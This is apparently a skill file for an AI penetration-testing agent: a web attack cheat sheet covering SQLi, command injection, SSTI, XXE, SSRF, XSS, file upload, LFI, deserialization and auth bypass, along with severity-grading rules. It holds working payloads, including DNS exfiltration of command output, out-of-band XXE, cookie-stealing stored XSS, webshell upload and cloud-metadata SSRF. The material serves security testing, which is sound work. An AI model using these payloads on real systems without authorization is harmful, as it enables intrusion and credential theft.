---
name: web-attack-methods
description: Use when testing a web application for injection, authentication bypass, or server-side and frontend vulnerabilities — verification techniques and bypass checklists for SQLi/command injection/SSTI/XXE/SSRF/XSS/file upload/LFI/deserialization/JWT/OAuth/SAML/NoSQL. Use when the intent involves "test injection / test authorization bypass / bypass authentication / upload a shell / read files".
tags:
  cwe: [CWE-89, CWE-78, CWE-94, CWE-79, CWE-918, CWE-22, CWE-434, CWE-502, CWE-639, CWE-287]
  attack: [T1190, T1059, T1090]
  class: [sql-injection, command-injection, ssti, xxe, ssrf, xss, file-upload, lfi, auth-bypass]
---

# Web Attack Techniques Cheat Sheet

## Usage discipline

- Fingerprint first (framework/middleware/language/parameter structure), then pick the technique; **do not blind-fire**.
- Every conclusion needs a real request+response; use `http_probe` for batch liveness and curl for the full echo.
- SQLi must come with a directly re-testable sqlmap command; XSS/SSRF with the minimal payload and echo evidence.
- Severity is graded by evidence: only real data obtained/command echo = L3+ can be reported as high/critical.

## Injection

### SQL injection
- Detection: `'`, `''`, `\`, numeric arithmetic (`id=1` → `id=2-1`); error/boolean/time three-way cross-confirmation.
- Type determination: numeric `1 AND 1=1`, string `' AND '1'='1`, parenthesis `') AND ('1'='1`.
- Manual confirmation:
  - Boolean: `' AND 1=1-- -` vs `' AND 1=2-- -` page difference;
  - Time: `' AND SLEEP(5)-- -` (MySQL) / `';WAITFOR DELAY '0:0:5'--` (MSSQL) / `pg_sleep(5)` (PG);
  - Error: `extractvalue(1,concat(0x7e,version()))`, `updatexml`.
- Automation (results must be manually re-checked against the echo):
  ```bash
  sqlmap -u "http://target/item?id=1" --batch --level=3 --risk=2 --technique=BEUSTQ
  # With a login state / explicit parameter location:
  sqlmap -u "http://target/api?id=1" --cookie "SESSION=..." -p id --dbms=mysql --current-db --current-user
  # POST JSON (mark the injection point with *):
  sqlmap -u "http://target/api/login" --data '{"username":"a*","password":"b"}' --headers "Content-Type: application/json"
  ```
- Bypasses: comments `/**/`, case changes, `%0b`, mixing `+`/`%20`, probing the `UNION SELECT` column count with `ORDER BY`;
  for WAF scenarios see "WAF bypass" at the end.
- Escalation paths: `FILE` privilege → OUTFILE webshell; MSSQL → `xp_cmdshell`; PG → `COPY ... PROGRAM`.

### Command injection
- Payloads: `; id`, `| id`, `|| id`, `&& id`, `$(id)`, `` `id` ``, `%0a id`;
- Without echo: time blind `; sleep 5`, DNS exfiltration `; nslookup $(whoami).<oob domain>` (use interactsh);
- Space bypasses: `$IFS`, `${IFS}`, `%09`; keyword bypasses: `c\at /etc/passwd`, `tac`, `nl`, `rev`;
- Conclusion evidence: the raw command echo (whoami/id/hostname); do not report "suspected" only.

### SSTI
- Detection: `{{7*7}}` (Jinja2/Twig), `${7*7}` (FreeMarker/JSP EL), `#{7*7}` (Ruby), `<%= 7*7 %>`.
- Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`;
  FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- First report "template engine identified + expression evaluated"; RCE is high severity and needs a full command echo.

### XXE
- Classic: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`;
- OOB: `<!ENTITY % p SYSTEM "http://<oob>/x.dtd">%p;` (interactsh collects the DNS/HTTP hit);
- Blind XXE over DNS is enough to prove parsing succeeded; reading file contents is L3 evidence.

### NoSQL (Mongo)
- `{"username":{"$ne":null},"password":{"$ne":null}}`, `{"$regex":"^a"}`, `{"$where":"sleep(5000)"}`;
- Watch for JSON request bodies and parameter pollution (the `username[$ne]=` form).

## Authentication and authorization

- Auth bypass: `admin'--`, predictable password-reset tokens, Host header poisoning, `X-Forwarded-For` spoofing to the intranet;
- IDOR: swap the object ID for horizontal access, `{"role":"admin"}` mass assignment, enumerable UUIDs;
  use `auth_request` to assemble the **second identity**'s control request and `diff_responses` to compare bodies;
- JWT: `alg:none`, RS256→HS256 confusion, weak-key cracking (`hashcat -m 16500`), `kid` injection, `jku/x5u` pointing at your own JWKS;
- OAuth/OIDC: `redirect_uri` substring/suffix/@ confusion, missing `state` (CSRF), PKCE downgrade, treating `id_token` as a normal JWT;
- SAML: signature wrapping (XSW), signature stripping, comment truncation `admin<!---->@evil.com`;
- 401/403 bypass: `/admin/`, `/Admin`, `/%2e/admin`, `/admin;`, `/admin..;/`,
  `X-Original-URL` / `X-Rewrite-URL` / `X-Forwarded-For: 127.0.0.1`.

## Server side

- LFI: `../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`,
  `data://`, `phar://` (deserialization), log poisoning (write `<?php ...?>` into the UA → include the log);
- File upload: `shell.php.jpg`, `.PHP`, `.php.`, `%00` truncation (old versions), `.htaccess` to change parsing,
  `GIF89a` magic bytes + code; after a successful upload you must get execution echo, otherwise it only counts as "uploadable";
- Deserialization: Java (ysoserial/CC chains), PHP (`__wakeup`/`__destruct`), Python pickle,
  .NET (`TypeConfuseDelegate`) — locate the sink first, then pick the chain; no blindly firing gadgets;
- Spring-specific paths: `/actuator` allow-list plus `/actuator/../api/...` traversal to bypass the interceptor;
  `X-HTTP-Method-Override` to rewrite the method;
- SSRF: `127.0.0.1` variants (`2130706433`, `[::1]`, `0x7f000001`), `#@`, `nip.io` resolution;
  cloud metadata `169.254.169.254` / `metadata.google.internal`; `gopher://` against Redis/MySQL;
- Deserialization/template/upload conclusions need a full exploit chain or a minimal echo; otherwise downgrade to medium.

## Frontend

- XSS: build separately for HTML/attribute/JS contexts; for DOM XSS look at `innerHTML`/`document.write`/`eval`;
- Stored XSS (support/tickets/IM): a message enters the agent panel via WebSocket/STOMP and is rendered with `innerHTML` →
  executes in the **administrator's browser**; target `document.cookie`, `localStorage` tokens, exfiltrate via interactsh;
- CSP bypass: JSONP endpoints, AngularJS CDN allow-lists, missing `base-uri`;
- Frontend leaks: sourcemaps (`.js.map`), hard-coded keys/AK/SK, internal endpoint addresses, test-environment domains —
  record a fact immediately (full credential text) and bring it into later testing.

## WAF / CDN bypass essentials

- Encoding layer: URL double encoding, Unicode, `%0b`, chunked transfer, case changes/comments;
- Semantic layer: equivalent function substitution (`SLEEP`→`BENCHMARK`), synonymous parameters, JSON nesting;
- Infrastructure layer: origin IP leaks (historical DNS, certificates, subdomains), ports the CDN does not cover (`8080/8443`),
  `X-Forwarded-Host` rewriting;
- If it is confirmed to be blocked by a WAF (e.g. 403 page characteristics) → record "blocking mechanism + bypassability"; do not treat it as a vulnerability in the report.

## Recording and escalation

- For each confirmed point: `record_fact` (including the key request/response lines); once the impact is confirmed, `report_finding` and bind the traffic evidence;
- If several techniques fail on the same parameter → record a negative-result fact to avoid re-firing;
- To raise severity you must give "real impact": command echo, file contents, other people's data read via IDOR;
  an error/latency alone → medium at most, noting the exploitation conditions.

## Frontend build artifact leakage (SPA/Vue/React)

- Sourcemap leakage: `//# sourceMappingURL=x.js.map` → fetch the `.map` → `sourcesContent`
  = the full original source (components/endpoints/keys). The platform tool **`js_audit`** does the whole chain in one call (see
  the same-named section in api-recon); manual version: `curl -s <js>` and look for the hint at the tail → `curl <js>.map | jq -r '.sources[]'`.
- Chunk endpoint extraction: pull everything out of the bundle — `"/prod-api/..."`, `baseURL`, `axios.create`,
  vue-router `path:"/..."` — as the endpoint inventory (undisclosed endpoints = new attack surface).
- Key scanning: `LTAI` (Alibaba Cloud AK), `AKIA` (AWS), `-----BEGIN PRIVATE KEY`,
  `eyJ` (JWT), `accessKey/secretKey/appSecret` key-value pairs — a hit that can actually be used = critical.
- Grading: pure source-structure restoration = high (CWE-540); containing usable keys/undisclosed endpoints = critical depending on impact.
